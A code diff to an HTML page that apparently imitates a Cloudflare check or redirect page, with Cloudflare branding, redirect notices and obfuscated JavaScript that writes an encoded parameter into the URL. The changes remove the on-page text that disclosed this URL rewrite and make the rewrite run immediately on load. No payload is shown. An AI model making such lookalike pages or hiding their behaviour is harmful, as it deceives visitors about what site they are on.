@@ -13,7 +13,7 @@
         }
 
         body {
-            background: #fffff;
+            background: #ffffff;
             color: #333;
             min-height: 100vh;
             display: flex;
@@ -157,15 +157,17 @@
             height: 32px;
             border-radius: 2px;
             position: relative;
+            background: #f38020;
         }
 
         .cloudflare-logo::before {
             content: "";
             position: absolute;
-            top: 5px;
-            left: 5px;
-            width: 14px;
-            height: 14px;
+            top: 8px;
+            left: 8px;
+            width: 16px;
+            height: 16px;
+            background: white;
             border-radius: 2px;
         }
 
@@ -241,17 +243,6 @@
             left: 5px;
             border-radius: 1px 1px 0 0;
         }
-
-        .url-info {
-            font-size: 11px;
-            color: #999;
-            text-align: center;
-            margin-top: 10px;
-            word-break: break-all;
-            max-width: 100%;
-            overflow: hidden;
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -270,7 +261,7 @@
 
             <div class="cloudflare-section">
                 <div class="cloudflare-brand">
-                    <img src="cloudflare_.png" class="cloudflare-logo" alt="Logo">
+                    <div class="cloudflare-logo"></div>
                     <span>CLOUDFLARE</span>
                 </div>
                 <div class="privacy-terms">Privacy · Terms</div>
@@ -279,7 +270,6 @@
 
         <div class="status-text" id="statusElement"></div>
         <div class="redirect-notice" id="noticeElement"></div>
-        <div class="url-info" id="infoElement"></div>
     </div>
 
     <footer id="footerElement">
@@ -295,7 +285,6 @@
             const d = document.getElementById('textElement');
             const e = document.getElementById('statusElement');
             const f = document.getElementById('noticeElement');
-            const g = document.getElementById('infoElement');
             const h = document.getElementById('footerElement');
 
             let i = false;
@@ -326,9 +315,6 @@
                 t.searchParams.set('encoded', s);
 
                 window.history.replaceState({}, '', t.toString());
-
-                g.textContent = `URL updated with encoded parameter: ${t.toString()}`;
-                g.style.display = 'block';
             }
 
             function u() {
@@ -340,6 +326,9 @@
                 }
             }
 
+            // Process URL immediately on page load
+            u();
+
             setTimeout(function() {
                 a.style.opacity = '0';
 
@@ -347,7 +336,6 @@
                     a.style.display = 'none';
                     b.classList.add('show');
                     h.classList.add('show');
-                    u();
                 }, 500);
             }, 2000);
 
